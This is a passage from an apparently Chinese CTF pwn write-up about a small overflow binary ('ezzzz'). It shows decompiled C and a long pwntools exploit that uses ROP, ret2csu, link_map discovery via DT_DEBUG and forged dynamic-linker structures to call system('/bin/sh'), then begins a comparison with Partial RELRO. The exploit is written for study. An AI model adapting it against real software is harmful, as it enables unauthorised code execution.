class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_40071B();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目的代码很简单，<code>main</code>函数就只有这几行代码，并且没有任何输出函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400606</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + (<span class="keyword">int</span>)a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段函数则是刚好满足第二个函数，能够实现任意地址读取之后写入到任意地址。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>因为前面已经提到了利用原理，这里就不多赘述直接上exp吧。</p><p>因为我的exp是边打边写的，所以写得像一坨shit所以我在每一步都加了注释方便理解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007e3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004007e1</span></span><br><span class="line">bss = <span class="number">0x601040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">gadget_for_read = <span class="number">0x400606</span></span><br><span class="line">gadget_for_write = <span class="number">0x40067C</span></span><br><span class="line">gadget_csu = <span class="number">0x4007DA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造成read一次之后返回到main</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在固定位置写上经过csu之后需要跳转的函数位置</span></span><br><span class="line">r.sendline(flat(bss + <span class="number">0x10</span>, gadget_for_read, <span class="number">0xBEEFDEAD</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过csu调用到gadget_for_read，目的是将BEEDDEAD读取到0x601030</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>, <span class="number">1</span>,</span><br><span class="line">               <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一样的为后续做准备，这里将0x601050和0x601040的指设置为(0x600EC0 + 0x8)也就是DT_DEBUG</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就是读取DT_DEBUG中的d_ptr的值，并写到0x601040的位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置a1为8，读取r_debug中的d_val值(即为link_map)并存放在0x601040位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置a1位-0x54680 + 8，获得link_map-&gt;l_next-&gt;l_next-&gt;l_info[3]的值(即为libc的got表地址)并存放在0x601040的位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, -<span class="number">0x54680</span> + <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置a1为0x10，获得_dl_runtime_resolve函数地址，并存放在0x601fd0位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">501</span>, <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里又一次读取了一下DT_DEBUG + 8的内容</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是向0x601020位置写入link_map地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这一步是修改link_map的dynrel指针指向bss段</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_write, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0x1f</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在bss段的对应位置写上fake_dynrel</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x310</span>).ljust(<span class="number">0x20</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在fake_dynrel结构体的偏移为0x8的位置只想的是fake_rel的地址，所以还需要在这里伪造</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x310</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(bss+<span class="number">0x700</span>, <span class="number">7</span>, <span class="number">0</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake strtab和/bin/sh</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x40</span>, <span class="string">b&quot;system\x00&quot;</span>).ljust(<span class="number">0x50</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖link_map中strtab指针的地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0xd</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake_symtab</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, elf.got[<span class="string">&#x27;read&#x27;</span>]-<span class="number">8</span>).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖link_map中的symtab指针的值</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0xe</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取link_map地址到0x601040位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入link_map地址，实现栈为_dl_runtime_resolve(&lt;-rsp)=&gt;link_map=&gt;0 并且此时rip为ret</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">503</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过栈迁移，顺利执行dl-runtime-resolve</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x601fc8</span>, pop_rdi, bss+<span class="number">0x100</span>+<span class="number">0x50</span>, <span class="number">0x400772</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r, <span class="string">&#x27;directory ./glibc-2.35/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="重点：与Partial利用方式的区别"><a href="#重点：与Partial利用方式的区别" class="headerlink" title="重点：与Partial利用方式的区别"></a>重点：与Partial利用方式的区别</h2><h3 id="Partial利用方式重谈"><a href="#Partial利用方式重谈" class="headerlink" title="Partial利用方式重谈"></a>Partial利用方式重谈</h3><p><strong>( 在下面讨论老版本时，默认只存在栈溢出，不存在上述题目中的gadget )</strong></p><p>在以前的文章，在64位的partial保护中我写的非常粗糙，所以在这里也趁此机会详细谈一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 